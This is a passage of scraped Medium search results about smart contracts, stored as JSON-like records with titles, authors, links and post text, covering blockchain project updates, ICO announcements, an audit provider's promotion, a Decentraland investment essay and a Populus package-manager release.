A solid smart contract that protects both sides and provides transparency will improve a project\u2019s credibility. This should not be underestimated.Positive ExceptionsThe above may sound very negative, but most projects have managed to improve their process through the auditing procedure and their contract can now be considered secure (or as secure as they can be).In addition, several projects have surprised us positively.The XCHNG token sale stands out amongst ICOs for exceptionally well written smart contracts employing known good practice guidelines.CryptoFights is a blockchain-based game that represents game characters and their accessories as digital assets on the blockchain. In addition to not following the ICO model, the smart contracts we have audited were refreshingly original, well organized and secure.(Disclaimer: The author has been previously engaged for technical writing by the CryptoFights team but is not paid for this mention. Nor does the author or Cryptronics hold any CryptoFights shares or tokens).The Importance of Smart Contract\u00a0AuditsThe nature of smart contracts makes due diligence auditing a necessity. The process is neither simple nor fast and projects should allocate both budget and time for external smart contract audits, preferably from more than one independent providers.Cryptronics is an experienced smart contract audit provider with a well-defined workflow. Feel free to look at an example audit report from the above-mentioned CryptoFights and contact us for information on pricing and process.", "responses": "3"}, {"title": "Decentraland and Smart Contract\u00a0REITs", "author_name": "Jeremy Epstein", "link": "https://medium.com/datadriveninvestor/decentraland-and-smart-contract-reits-da15621d847?source=search_post", "post_date": "Feb 20", "readtime": "4 min read", "upvotes": "100", "content": "Decentraland and Smart Contract\u00a0REITsJeremy EpsteinBlockedUnblockFollowFollowingFeb 20tl;dr: Virtual worlds with real estate secured by the blockchain will one day be commonplace. Virtual real estate developers and Real Estate Investment Trusts will come along as well.I went in recently and bought some plots in Decentraland.It\u2019s a virtual reality world where ownership is guaranteed and secured by the Ethereum blockchain.https://youtu.be/-HmXrOTEmxgI will admit that, when I first heard about it, my initial thought was \u201coh man, it\u2019s Second Life all over again.\u201dOf course, more than 10 years in, there are still approximately 800,000 die-hards playing and there\u2019s an exchange rate for 250 Linden dollars to $1 USD. Definitely not a raging success, but it was a global phenom at one time and could be viewed as a powerful proof-of-concept over time.Now, however, with stronger computing power, virtual reality technology, and of course the strong cultural pull of Snow Crash with its Metaverse and, more recently, Ready Player One, I wondered if the world might-this time-be ready?So I dove in and encountered the grid for all of Decentraland.As you can see, it\u2019s a coordinate graph. Each square represents a virtual 10m x 10m space. The light blue ones are for sale. The purple ones are \u201cdistricts\u201d set aside for specific uses, such as fashion, retail, and needless to say, a red light district.I\u2019m not 100% clear on how districts get created yet.The green areas are parks/common areas and, from what I can tell, people who own the land around those are speculating that those center areas will have more value, like in the real world. Who knows?I, however, went for one of the cheapest plots around, so I\u2019m on the outskirts, but oh well.On the surface, I can understand why it seems silly.I mean, why the hell would anyone buy a piece of virtual property in a make-believe place that, for the most part, no one knows about and there\u2019s really nothing you can do?Today, the answer is: speculation.Tomorrow, the answer may be\u2026because there\u2019s a lot to do there.Decentraland offers developers a kit so they can build applications and experiences on top of the virtual land they own.\u201cThe Decentraland SDK provides everything you need to start developing games and applications. Control every object, model, sound, and Ethereum transaction in your LAND parcel.\u201dIt\u2019s not so crazy to imagine a VR world that you can explore and then, if you see a shop you like, you go it and play a game or buy something. Why not?People will end up spending their MANA (the coin of Decentraland) to pay for these experiences. That MANA then, in turn, allows developers to buy more LAND parcels, building better (and more expensive) experiences. This drives demand and, naturally, increases the price of the MANA token.Lest you think I am totally crazy, MANA is listed on Coinbase Pro. Of course, it does seem recently that Coinbase\u2019s standards have been dropping a bit as they chase revenue, but it\u2019s still higher than most other exchanges.Smart Contract REITsAs I explored Decentraland further, I started thinking about the cost of real estate in a virtual world. Then, I thought about the investment opportunity there. Let\u2019s say that, in the future, people do go to Decentraland and visit, play games, shop, and interact.That would make the real estate valuable, which means that there will be virtual real estate investors and developers.In the future, a Smart Contract REIT could get set up. It could be run as a Decentralized Autonomous Organization (say using DAOstack)You\u2019d send your crypto there and the smart contract would buy LAND according to the rules of the DAO. As a shareholder in the DAO and the smart contract REIT, you could vote on the kind of LAND you want to buy and where. Do you want to develop in the red light district or in Chinatown?All of this would happen without the backend administrative costs that centralized REITs have and in a much more liquid environment.And the \u201ctrust\u201d in the Real Estate Investment Trust won\u2019t be in the people, it will be in the code of the smart contract.Something like a Decentraland will work.When it does, entirely new industries and opportunities will pop up to go along with it.", "responses": "3"}, {"title": "Dao.Casino Dev Update\u200a\u2014\u200aApril 17th 2018: Audit, smart contract development and Crypto Games Conference partnership", "author_name": "DAO.Casino Team", "link": "https://medium.com/@dao.casino/dao-casino-dev-update-april-17th-2018-audit-smart-contract-development-and-crypto-games-61b5eb4c4edc?source=search_post", "post_date": "Apr 17, 2018", "readtime": "4 min read", "upvotes": "89", "content": "Dao.Casino Dev Update\u200a\u2014\u200aApril 17th 2018: Audit, smart contract development and Crypto Games Conference partnershipDAO.Casino TeamBlockedUnblockFollowFollowingApr 17, 2018Great to have your eyes again for the latest article in the DAO.Casino Dev Update series. As always, we welcome your feedback, so please don\u2019t hesitate to share! The easiest way to do this is via our Telegram group, so head over there to join the discussion. Now, let\u2019s get to our latest developments.Updated roadmapAuditWe are proud to announce that the audit of our smart contracts is nearing completion. A lot of time and energy has gone into the audit process and our developers have really shone. We have responded quickly to the suggested changes of the audit team, implementing recommendations as they arose. The process is almost complete with our team working through the latest few recommendations.While the audit team has moved its focus onto our software development kit (SDK), a pivotal creation by the DAO.Casino developers, our development team will continue to implement the latest best practice into our smart contracts, as well as create a series of smart contracts in relation to each of the games in development.The development team will keep a keen eye on any recommendations coming from the audit team in relation to our SDK. We will implement changes as and when they are required to complete the audit process ASAP. We still consider the audit process, and its completion, to be a necessary and important step in our protocol development.Smart contracts developmentOur Solidity developer Alexander Davydov has spent the last week working on the development of a solidity-coverage tool. This tool is an instrument for determining the test coverage of a smart contract and will significantly increase the quality of our manual and auto testing.Alongside this, he has also optimized the DAO.Casino protocol smart contracts and updated them to run on Solidity version 0.4.21.Game developmentDevelopment of our Lottery game is ticking along smoothly. Our game developer Sergey Pomorin is finalizing work on our Lottery game smart contract, which now includes a multi-draw function.Following successful testing of Sergey\u2019s updates of this contract in Rospten. Sergey has moved on to consider a methodology for fine tuning and optimizing both lottery tickets and prize customization.Sergey has also completed work on an external development tool that will allow developers to deploy our Lottery game.Approximately half of the remaining development work for our Lottery game requires cooperation from our contracted design studio. In the past week we have approved technical mock-ups for the design of our Lottery game and now the studio is working hard to progress these further.Business development\u200a\u2014\u200aCrypto Games Conference partnershipMore than 300 of the world\u2019s leading experts on blockchain, crypto and online games are expected\u200b \u200bto\u200b \u200bgather for a 1 day summit in Kiev, which will feature keynote speakers including CryptoKitties creator, AxiomZen, Gabby Dizon, the founder of Alto.io, Eman Pulis, the founder and CEO of the SiGMA and of course, DAO.Casino. Having our project recognised on this stage as one of the main partners of the conference is a testament to the hard work of our development team and the unwavering support of the DAO.Casino community.Participation in major conferences is crucial for DAO.Casino. These conferences allow DAO.Casino to be recognised as leading the way in developments for the online gaming community and are the where the majority of our partnerships are likely to be sourced. We hope to collaborate with a number of the game developers who will be in attendance all of whom are either currently building or considering building their own blockchain games. We will use this opportunity to inform others on how we can provide such development projects with our PRNG, smart contracts and protocol\u200a\u2014\u200aessentially welcoming them to the DAO.Casino gaming ecosystem.Importantly, during this conference, DAO.Casino will be providing the gaming community with our very first content examples. These examples will include our Slots, Dice and Lottery games. With these games being based on blockchain technology and powered by DAO.Casino, we will be presenting real games integrated within our protocol.The conference will take place on May 11th, in Kiev, Ukraine. All in, there will be more than 26 speakers from the USA, Europe and Asia. As well as the keynote speakers listed above there will be speakers from our current partners, Rockspro and DiceyBit, as well as speakers from the developers of Spells of Genesis, WAX, Panther Gaming, Bitguild, True Flip, Attracti VF, Beatshapers, EverdreamSoft, Terra Virtua, Parsec Frontiers, EtherSport, Tokenized Games, DappRadar, Decentraland, Crypto Bit Games and many others.Should any of our community members wish to attend the conference, we will of course be very happy to increase our community\u2019s representation. To that end, we will be providing community members (upon request) with a promo code for discounted entry to the conference.We will be back in two weeks with more updates on our development team\u2019s progress. Join us on Telegram or Twitter for development discussions and notifications for our future updates. So stay tuned, and let\u2019s disrupt the online gaming industry together!", "responses": "2"}, {"title": "Update: Product and Smart\u00a0Contract", "author_name": "Crowdholding", "link": "https://medium.com/@crowdholding/update-product-and-smart-contract-959bab0b8bf3?source=search_post", "post_date": "Jan 18, 2018", "readtime": "4 min read", "upvotes": "135", "content": "Update: Product and Smart\u00a0ContractCrowdholdingBlockedUnblockFollowFollowingJan 18, 2018We have all witnessed some bloodshed in the crypto market over the past couple of days, but we cannot afford to be alarmed. We are confident in Ethereum, not because we are following hype around the value the token has generated since inception, but because the technology is fantastic\u200a\u2014\u200asecond generation scalable blockchain. We are keeping our eye on the next step in technology but until then, Ethereum seems to be sensible to follow. All dapps should also be thinking this way in order to succeed, and we will make sure this message is clear to all projects on our app. We must encourage building the infrastructure for the future, and ignore bad players who manipulate the market. Building a solid product and having a great community is always our focus.We must always be transparent about our policies, and even mistakes. We believe we can overcome any obstacle with your support. This is why we will be updating our progress and having you solve tasks on our app. We see you (the community) like a member of our company, with a voice and a vote.ProductLet\u2019s begin with the product, and how the smart contract will support our token movement model. As you know, we have token (ERC20) and non-token businesses on our application.ETH values displayed are just\u00a0examplesIn the chart above, business pay for YUPs directly on our app, which is automated by purchasing on the exchange. To cover the costs we take a % rate fee.The plan is to make the YUP to dollar conversion visible on our app, similar to how Steemit uses dollars to show their token value from user comments.Tasks should be worth anywhere between $5 to $100, depending on task duration and difficulty.Non-token businesses only use YUPs (e.g 50 Yupies / task), while token businesses have a smaller % of YUP attached to their tasks.(e.g (10 YUP + 50 Beer tokens) / task)For ERC20 tokens, we take a small % which we hold. Thus if their token succeeds, we succeed, and our community succeeds. A win\u200a\u2014\u200awin scenario.Monetary PolicyThank you all for contributing to our token supply amount task. There\u2019s still time to answer before it expires. So if you have not given your feedback, please do here. What we need to solve has to do with the specific groups connected to the YUP: Investors, Startups, and Users. In order for our app to thrive, we must make sure all three groups benefit.Startups: They must not be affected by the volatility of the YUP. That\u2019s why we introduced payments in ETH in order for quick and seamless process how to acquire ETH for YUP on our platform.Investors: If the value of the YUP grows too much, this means everyone will hold YUP and not distribute the tokens on our platform. This is an important economic issue many tokens will face in the future. In order to solve this, we must consider a max supply higher than the distributed supply. We will launch a task shortly so this can be discussed more deeply.Users: These are innovators who wants to be rewarded for their time and support of a business. The Yupie is the reward (plus bonus ERC20 tokens). You will then have the option to invest, spend, or save. However, we must make sure the YUP is not all held, but is actually used. Meaning users want to spend or invest in fresh business innovations and products. While completing our feature logic that will make our crowdsourcing system run smoothly, we must keep collecting data together in order to achieve this through the evolution of our product.To keep up with the evolution of our crypto community, we plan to allow the smart contract in the future to be adjustable. The reason why has to do with the current market moving fast, and one prediction mistake using a non-adjustable smart contract can hurt the business and even collapse it. Keep in mind, other businesses that don\u2019t have this means they may have vulnerabilities in the future that will hurt them. However, any adjustments from our smart contract will be first requested by the community for approval as part of our process.Smart Contract DistributionThis week, we have been focusing on the monetary policy (rules of our token) and next week we will distribute new tokens. It\u2019s possible to do a \u2018YUP airdrop,\u2019 thus the wallet you used to initially receive Yupies will receive the new YUP token in place, taking account of any bonuses.If you transferred your YUP to a different wallet, the new tokens will still arrive in the origincal receiving wallet, not the wallet you transferred your YUP to. However, in order to be safe while we run the code, try to keep the old YUP tokens in the original receiving wallet. If you have moved them, we recommend putting them back for now. This will make it a lot easier for us to confirm everyone gets the correct quantity of the new token.We will keep updating you on a weekly basis. If you want to access our updates on a regular basis please join our Crowdholding News channel on Telegram.Keep up the good work y\u2019all, and one last CH philosophy to think about: \u201cBuild today what you envision for the future.\u201d", "responses": "1"}, {"title": "Ethereum Smart Contract\u00a0Teardown", "author_name": "Niharika Singh", "link": "https://medium.com/trycrypto/ethereum-smart-contract-teardown-c8743de8a608?source=search_post", "post_date": "Apr 24", "readtime": "10 min read", "upvotes": "153", "content": "Ethereum Smart Contract\u00a0TeardownNiharika SinghBlockedUnblockFollowFollowingApr 24If only contracts were smarter, the world would be a much better place, said no one ever. Yet, here we are inundated with references to blockchain smart contracts in every other technical article (yes, I get the Morissette-grade irony). Most of us have an intuitive sense of how smart contracts work, but it\u2019s challenging to separate hype from reality. What you need is a smart contract de-hyping superpower. And that is exactly what you will have in about 30 minutes as we do a hands-on teardown of a simple smart contract. Let\u2019s go!Source: teepublic.com/The concept of smart contracts dates back to 1994. Nick Szabo, a computer scientist, and a cryptographer is the brain behind smart contracts. (For those of you who don\u2019t know: he\u2019s very active in the blockchain space. You can find him on Twitter- @NickSzabo4.) If you wish to read Szabo\u2019s paper on smart contracts, click here. In his own words:\u201cA smart contract is a set of promises, specified in digital form, including protocols within which the parties perform on these promises.\u201dHowever, the philosophy couldn\u2019t be put into action back then due to lack of know-how and infrastructure. About 14 years later, in 2008, we saw the rise of the Bitcoin blockchain which employed a single smart contract. The contract\u2019s logic was to implement P2P (peer-to-peer) digital payments. Today, the Bitcoin blockchain network happens to be one of the most secure ways to transact value (bitcoin) in a P2P fashion.About five years later, smart contracts got married to the Ethereum blockchain. Oh, a match made in heaven! Smart contracts make the Ethereum blockchain use-case agnostic. Anyone can deploy any logic (smart contract) to the blockchain and anybody can use it.This brings infinite autonomy to developers where N use-cases can be deployed on a single blockchain ranging from P2P payments, to supply-chain management, to healthcare, to digital identity management, and beyond! You can check out more use cases on our website.In this article, we will compose and teardown a simple smart contract to learn the core concepts behind Ethereum smart contracts.", "responses": ""}, {"title": "ANU #9\u200a\u2014\u200aIAP Flow, Advertising and Smart Contract Development", "author_name": "AppCoins Official", "link": "https://hackernoon.com/anu-9-iap-flow-advertising-and-smart-contract-development-d08749fb6526?source=search_post", "post_date": "May 9, 2018", "readtime": "8 min read", "upvotes": "147", "content": "ANU #9\u200a\u2014\u200aIAP Flow, Advertising and Smart Contract DevelopmentAppCoins OfficialBlockedUnblockFollowFollowingMay 9, 2018AppCoins News Update, or ANU for short, is a regular bi-weekly update by the AppCoins team. As usual we are going to cover dev updates, market reports, team members and upcoming events. This week\u2019s focus is on IAP Flow, Advertising, ASF Wallet, ASF SDK and Smart Contract Development. You may expect the next ANU on the 23rd May.QuicklinksDev UpdateAPPC Markets ReportFeatured Team MemberUpcoming EventsAfter the Gosling release\u200a\u2014\u200awhich we\u2019ve been calling Alpha 3\u200a\u2014\u200awe\u2019re back to another news update about the current state of development. We\u2019ll cover what we are doing now and will be doing for the next couple of weeks.This ANU will cover changes to the IAP and Advertising flows, developments in the ASF Wallet and ASF SDK, and improvements to smart contracts development that are important for the protocol.AppCoins ProtocolAthough they are still in an alpha stage, we are doing some small improvements to the two flows that have already been released: In-App Purchases (IAP) and Advertising.IAP FlowThis flow enables developers to accept APPC as payment for in-app items. It is composed by the interaction between the developer\u2019s app, the ASF SDK integrated into that app, and the ASF Wallet (or any AppCoins compliant wallet in the future).Regarding the Blockchain part of the flow, it consists of two transactions:An approve call to the AppCoins token contract that enables the IAP smart contract to spend APPC from the userA buy call to the IAP contract that performs the action of buying an item, which executes the transfers from the user to the developer, app store and OEMFor the flow to be seamless for the user buying the in-app item, the wallet should check if there are enough funds of ETH (to pay for transaction fees) and APPC (to pay for the item itself) to perform both transactions before starting the flow of payment. We will publish an update of the ASF Wallet in Google Play and Aptoide with this fix.AdvertisingThe Advertising flow enables users to earn APPC from using and giving attention to apps that are implemented in active campaigns. These campaigns are created by the app developers, which can be done in the Create Campaign page and then seen in the Offer Wall.As for the IAP flow, the Advertising flow is also composed by interactions between the developer\u2019s app, the ASF SDK integrated into that app, and the ASF Wallet (or any AppCoins compliant wallet in the future). In this case, the SDK is responsible for checking if the app is being used and for triggering the ASF Wallet to compute the Proof-of-Attention (PoA) components that in the end will form a full PoA, which is sent to the Blockchain. We will publish a fix in the new version of the SDK, related to the PoA submission to the Advertising smart contract in the Blockchain. The SDK should check if the wallet is prepared for the PoA submission before starting the PoA computation process. The wallet should have an account already configured with the necessary amount of ETH to submit the PoA. Otherwise, after the 2 minutes that the computation of the PoA takes, the wallet will simply state there isn\u2019t enough ETH to submit the PoA to the Blockchain, and this translates into a bad user experience.In addition, the wallet should give feedback about the progress of the PoA computation instead of just stating it is being computed. This is also an improvement we\u2019ll publish in a new version of the ASF Wallet.ASF WalletAs we\u2019ve said in the Gosling release post, we are starting to redesign the ASF Wallet to improve the user experience and the easiness of the interaction with the AppCoins Protocol. We are starting this redesign with the transactions screen and with the individual transaction view, and we aim to have the transactions related to the AppCoins Protocol flows more understandable.Below are the current statuses of the transactions screen and individual transaction view, and what we want to achieve when we finish redesigning them.(Left) Current status of the Transactions screen; (Right) Transactions screen after\u00a0redesign(Left) Current status of the individual transaction screen; (Right) Individual transaction screen after\u00a0redesignASF SDKFor each flow in the AppCoins Protocol, all transactions are composed by a division between either the developer (IAP) or the user (Advertising), the app store and the OEM. The ASF SDK is responsible for sending data regarding the app store and OEM wallets to the ASF Wallet to make the division possible.For each transaction made, the SDK needs to be able to know the wallet account of both the app store and the OEM that should be receiving the respective amount of APPC. The protocol defines three possible attribution mechanisms:During installation of a given app, the app store informs the operating system (OS) that it has installed that app, and the ASF Wallet is able to get this data from the OS and map it to the app store\u2019s wallet address.During the installation of a given app, the app store broadcasts that it has installed that app and the SDK catches that broadcast. The broadcast should include the app store and the OEM that preloaded that app store (if applicable) and the identifiers, which is sufficient for the wallet to map them to the respective wallet addresses.If there\u2019s no data regarding which app store and OEM should receive their respective share of a given transaction, those shares go to default wallets addresses configured in the wallet.We\u2019ll start developing these mechanisms that will allow app stores and OEMs to start monetising using the AppCoins Protocol.Smart Contract DevelopmentSmart contract development is still in its early stage, with several platforms aiming to take the lead. As of now, Ethereum is still the most mature platform where developers can build their Apps. One important aspect of smart contract development in Ethereum is that when a smart contract is deployed to the network, it is unchangeable. If there\u2019s a bug or if more features should be included in the contract, a new deployment has to take place, and the address that should be used changes as well.In regards to the AppCoins Protocol, we are building several products (ASF SDK, ASF Wallet, webpages) that interact with our smart contracts. Since we\u2019re in the early stages of development of the protocol, there are several changes that need to be done every day or every week. As pointed above, every time we deploy a new version of a smart contract, all the products that interact with it need to be updated to point to the new address. This can become troublesome to manage and it increases the probability of compatibility errors during development because of lack of communication. When it comes to the ASF SDK, it becomes very difficult to ask developers to keep updating the version of the SDK they\u2019re using simply because of a new smart contract deployment.Therefore, we\u2019ve decided that we need to decouple the deployments of the smart contract from the other products development. We\u2019ll create a new layer between the smart contracts deployed and the products that use them that serve as a proxy. In addition, we\u2019ll also implement a solution to avoid losing all of the data in a smart contract when we deploy a new version of it. One can think of it as a version of an Eternal Storage.", "responses": ""}, {"title": "iExec Token Crowdsale Rescheduled to 19th April to Optimize Smart Contract\u00a0Security", "author_name": "Julien B\u00e9ranger", "link": "https://medium.com/iex-ec/iexec-token-crowdsale-rescheduled-to-19th-april-to-optimize-smart-contract-security-6bf5ee65ecc5?source=search_post", "post_date": "Apr 11, 2017", "readtime": "2 min read", "upvotes": "8", "content": "iExec Token Crowdsale Rescheduled to 19th April to Optimize Smart Contract\u00a0SecurityJulien B\u00e9rangerBlockedUnblockFollowFollowingApr 11, 2017We have taken the decision today to reschedule our RLC token crowdsale to the 19th April 2017 at 13:00 UTC.The security of your funds is our first priority. To date, we have open sourced the contract, described the security architecture of the crowdsale platform and the code has gone through several internal and external security audits and tests. Open Zeppelin has also openly published the security review of the smart contract, in which no critical errors or vulnerabilities were found, and we have thoroughly applied all their recommendations.However, we want to go deeper into the process by launching a bug bounty program.You may be aware that a bug was discovered last week in Ethereum that affected the way that tokens are handled by exchanges.\u201cThe bug was indeed the exchange\u2019s fault, but it was also related to the way Ethereum contracts see the transaction input data and Solidity ABI (e.g. the way the methods of Solidity contracts encode and decode arguments). So of course it was not specific to GNT, but indeed to all ERC20 tokens, as well as other contracts which have transfer-like methods. Yes you read it right: this could potentially work for any Ethereum-based token listed on said exchange, if only withdrawals were managed in the same way as GNT. We do not know this to be the case, but assume it was very likely.\u201dIn order to ensure the highest levels of security we have decided to push the crowdsale launch back one week to allow time to undertake a more thorough auditing process. We are committed to our project supporters and to delivering a great product to them\u200a\u2014\u200aensuring there is zero risk to crowdsale participants is part of that commitment. So we ask you to bear with us until Wed 19th April.If you have some programming skills you are invited to participate in our bug bounty program by joining our slack. We reward 50.000 RLC (10BTC) for anyone finding critical vulnerabilities that would prevent the crowdsale to execute correctly.In the meantime, we will continue to strengthen our presence across the community during this additional week. This includes an interview that we have been looking forward to with Epicenter Bitcoin.Join our crowdsale on 19th April and help launch the future of cloud computing!", "responses": ""}, {"title": "Populus 2.0 (alpha) with smart contract packaging support", "author_name": "Piper Merriam", "link": "https://medium.com/@pipermerriam/populus-2-0-alpha-with-76757d252aad?source=search_post", "post_date": "Feb 1, 2017", "readtime": "2 min read", "upvotes": "9", "content": "Populus 2.0 (alpha) with smart contract packaging supportPiper MerriamBlockedUnblockFollowFollowingFeb 1, 2017Today I\u2019m incredibly proud to publish an early alpha release of Populus with ERC190 support for installing smart contract packages. Go give it a try now, I\u2019ll wait\u2026$ pip install populus==\u201d2.0.0-alpha.1\"$ populus package install example-package-standard-tokenThen, from your contract codepragma solidity ^0.4.0;import {StandardToken} from \"example-package-standard-token/contracts/StandardToken.sol\";contract MyERC20Token is StandardToken(1000000) {  ...}A more in depth getting started guide can be found in the Populus documentation.Populus package management isn\u2019t a one way street. This release also includes support for publishing packages to The Ethereum Package Registry. ethpm.com is a Package Index built on top of the ERC190 specification. You can view the package index smart contracts here. This registry is the first step in moving smart contract development out of the stone ages and into the modern software development world.This release comes alongside the 3.0 release of the truffle development framework which also contains support for ERC190 packages as well as integration with the registry. We hope to see other frameworks integrate with the index as as well. We\u2019ve already written some documentation to make the process as easy as possible.The Populus 2.0 release line contains a lot of other API changes, many of which are not currently documented. I highly encourage you to try it out as long as you\u2019re fully aware that the 2.0 line is alpha software.Over the coming weeks and months new features in the 2.0 line will be better documented and backported one-by-one to the 1.x line with any breaking changes being marked for deprecation for 1\u20132 minor point releases before removal.Finally, I\u2019d like to specifically thank the developers from Dapple and Eris/Monax for their contributions to the ERC190 specification. It wouldn\u2019t be anything near what it is without their valuable insights and feedback on what smart contract packaging should look like.Thanks for your support.Piper", "responses": ""}, {"title": "How can Smart Contracts change the world of business?", "author_name": "Crowdholding", "link": "https://medium.com/crowdholding-innovation-platform/how-can-smart-contracts-change-the-world-of-business-46f00da93e87?source=search_post", "post_date": "Mar 28, 2018", "readtime": "3 min read", "upvotes": "110", "content": "How can Smart Contracts change the world of business?CrowdholdingBlockedUnblockFollowFollowingMar 28, 2018In one of our previous articles we discussed what a Smart Contract is. In this article we will focus on why and how Smart Contracts will disrupt the world of business.Recently there has been a lot of discussions around smart contracts and their ability to hold up in a legal. In Florida, a law maker is pushing a bill that would create a legal foundation for the use of blockchain technology and Smart contracts in the Sunshine State.So what are the benefits that are propelling the discussions about Smart Contracts?Smart Contracts live on a shared database (A blockchain) where all parties have a copy \u2013unlike today\u2019s systems where every party stores their own records, usually in paper form. If anything in the physical world can represent a data point with attributes and rules, then it can be formulated into a smart contract.Instant VerificationWith smart contracts, transactions occur the moment contract terms are fulfilled. Currently with written contracts, it can still potentially take months for an asset to be moved from one party to another after a contract is signed by all the individuals involved.There is no long-winded verification process to make sure that everything is in order. Approvals are verified in real-time, based on conditions set in the contract, without human bottlenecking.Where complex \u201cagreements\u201d need a second or third check, Smart Contracts move forward with efficiency and speed.From a business standpoint, consolidating tasks and automating them can help streamline business operations and boost efficiency, allowing employees to concentrate on other tasks.Lower costsBusinesses could also save on numerous costs. Smart contract platforms can take over functions usually done by intermediaries like banks, escrow services, and even legal services (in the future). A McKinsey report estimated that blockchain / smart contract technologies could save businesses at least $50 billion in B2B transactions by 2021.Authority and\u00a0safetySmart contracts are stored on a blockchain that is duplicated into a series of copies stored across a network of separate machines. In other words, completely decentralized.If one copy is altered or hacked, the majority eliminates the anomaly.The processing power required to corrupt a blockchain ledger entry doesn\u2019t exist today. In other words, trust and transparency is built into the system. Unlike any other system used before. Of course development will need to continue to keep a few steps ahead of threats.What industries could it\u00a0change?There are a lot of different industries that look likely to benefit from smart contracts\u200a\u2014\u200ameaning smart contract developers are in for a huge 2018. Some examples of industries that might benefit include:Real estate\u200a\u2014\u200aThe tech cuts out costly contract writing and also could save time as there would be no need to consistently check over the contract with numerous parties.Elections and Politics\u200a\u2014\u200aSmart contracts could mean unriggable elections. The ledger is stored on the network and would require altering at all terminals\u200a\u2014\u200aan impossible task\u200a\u2014\u200ato manually change the voters decision. This idea might have seemed like a nonstarter in 2016, but with mounting evidence of Russia\u2019s involvement in the US election, it\u2019s something to consider.Healthcare\u200a\u2014\u200aPeople personalised healthcare records could be secured on a digital ledger. This would be incredibly useful for insurance purposes / medical staff as it would make finding medical records quicker.Supply chain and logistics\u200a\u2014\u200aThis has been heralded as low hanging fruit for blockchain. Want to know where your bottle of wine actually came from? Smart contracts can do just that by producing a digital record of an items movement across the world.Entertainment Industry\u200a\u2014\u200aSmart contracts can also help with the royalty payments issues in the entertainment industry. There\u2019s a commonly known problem with determining who owns the rights to a particular song or any other works of art. A smart contract solution could help track all ownership rights. Any data change requires the approval of all parties on the network which ensures trust in ownership.Here at Crowdholding, we truly believe that Smart Contracts are a revolutionary technology that has many applications, the only thing standing in the way is mass adoption of the new tech.You can keep up to date with what is happening at Crowdholding by following us at Facebook, or chatting with us on telegram.", "responses": ""}, {"title": "\u00e6pps update: Smart Contract Development", "author_name": "\u00e6ternity", "link": "https://blog.aeternity.com/aepps-update-smart-contract-development-96241f65b07d?source=search_post", "post_date": "Aug 29, 2018", "readtime": "4 min read", "upvotes": "130", "content": "\u00e6pps update: Smart Contract DevelopmentAt \u00e6ternity, the developer experience is just as important for us as the experience had by end users of our \u00e6pps. For this reason, we build a number of developer tools and write tutorials to enable anyone to engage with our blockchain. Prior to our Mainnet release we will be publishing a few blog posts specifically for developers who would like to build on our blockchain.\u00e6ternityBlockedUnblockFollowFollowingAug 29, 2018Developer AudiencesWithin the developer audience we are are currently serving three sub-audiences: smart contract developers, developers familiar with JavaScript (running in the browser or in the back-end), and Python developers. This post is dedicated specifically to smart contract developers.What are \u00e6ternity Smart Contracts?Smart Contracts are programs which live on the blockchain and allow users to formalize agreements between each other. Virtual machines running on nodes execute the contracts, for which the nodes receive fees. A contract will run when it receives notification of an event from the outside world, such as the transfer of a payment from a user, or some other real-world event identified by an oracle.Contracts must be compiled before they are uploaded to the blockchain. Epoch will compile contracts, but external compilers will be available as well. The compiled bytecode is stored on the chain and executed by the nodes. This execution uses CPU power on the nodes, and so it is paid for, using gas.Sophia Smart Contract Language & Tools for Smart Contract DevelopersFor our Mainnet launch we will support the Sophia smart contract language. You can learn more about what makes Sophia an excellent smart contract language in one of our previous posts, in our webinar Sophia, a functional blockchain language, as well as on Github.We have deployed a Testnet compatible with our \u00e6pps SDKs: https://sdk-testnet.aepps.com. Developers can also run their own Testnet by following this guide.Testnet Tokens\u00a0FaucetIn order to acquire Testnet tokens needed to run and test smart contracts developers can use our Testnet faucet: https://faucet.aepps.com/ All they need to do is enter their public address and click \u201cTop up!\u201d.Contracts Web\u00a0ToolSmart contract developers can write, deploy, and call smart contracts using the web tool which we built for this purpose: https://contracts.aepps.com/. The tool is connected to the \u00e6pps Testnet mentioned above.This is what the smart contract tool above looks like after a contract is compiled to bytecode:Currently this contract editor uses an account which has been given a great deal of gas. It always executes in the context of this account, which makes it suitable for testing. Of course, in the future, developers will run this editor in the context of their own accounts, using their own gas. Anyone wanting to run the editor themselves can find it in its GitHub repository, https://github.com/aeternity/aepp-contracts.Mainnet WorkflowOnce our Mainnet is live the workflow will be very similar. Users will still be able to use our contracts tool, but we expect that more and more developers will opt to run it themselves, and we expect third parties to develop tools to work with our contracts.Coming UpIn our next posts we will discuss how application developers can use our JavaScript and Python SDKs to build on top of the \u00e6ternity blockchain. As always, stay tuned for more exciting updates related to our \u00e6pps and development tools and feel free to contact us directly on our Forum and in GitHub.", "responses": ""}, {"title": "What you need to know about SOLIDUS Smart\u00a0Contract", "author_name": "Peculium", "link": "https://medium.com/@Peculium/what-you-need-to-know-about-solidus-smart-contract-9172ab9fd216?source=search_post", "post_date": "Nov 9, 2017", "readtime": "2 min read", "upvotes": "108", "content": "What you need to know about SOLIDUS Smart\u00a0ContractPeculiumBlockedUnblockFollowFollowingNov 9, 2017PECULIUM offers asset-management solutions with pre-defined terms in the form of smart-contracts and guess what\u00a0! We have provided three types of smarts contracts: SOLIDUS, ALTERUS and SINGULUS.But first What are smart contracts\u00a0?Simply they are programs running over the digital ledger; they will help you exchange your money with no need for middlemen (third parties) in a decentralized way.Once they are created, they remain unchangeable over the Blockchain.Therefore, these smart-contracts provide a completely transparent and trust-less way of signing a pledge of confidence directly between the engaging parties. Furthermore, it increases decentralization of the platform leading to democratization of contractual relations.Now, here is what you need to know about Peculium SOLIDUS smart contract:SOLIDUS is an end to end (E2E) smart-contract designed specifically for Businesses and Institutions. It is offered at various intervals of 1 week, 1 month, quarterly, and 6 months.SOLIDUS integrates all (137+) basic algorithm features such as security, stability, balance, serenity. Apart from the technical analysis, indicators and the rating reports, all benefits available on the PECULIUM platform are already integrated in the SOLIDUS. Most importantly, SOLIDUS benefits from the power of AIEVE for absolutely free with a limited set of parameters to choose from. At the end of each solidus contract period the smart-contracts return the predefined proportion of the profits to the investors.Also\u00a0, Our GitHub is ready for you all\u00a0! Come take a look\u00a0!To read more about Peculium check the White Paper.You can follow Peculium\u2019s news and updates on our Media:Twitter: https://twitter.com/_PeculiumFacebook: https://www.facebook.com/PeculiumICO/Telegram: https://peculium.io/telegram", "responses": ""}, {"title": "EOS Shows Transparency is Essential in Resolving Smart Contract\u00a0Disputes", "author_name": "Amy Wan", "link": "https://medium.com/sagewise/eos-shows-transparency-is-essential-in-resolving-smart-contract-disputes-6755b19312d1?source=search_post", "post_date": "Jun 22, 2018", "readtime": "3 min read", "upvotes": "90", "content": "EOS Shows Transparency is Essential in Resolving 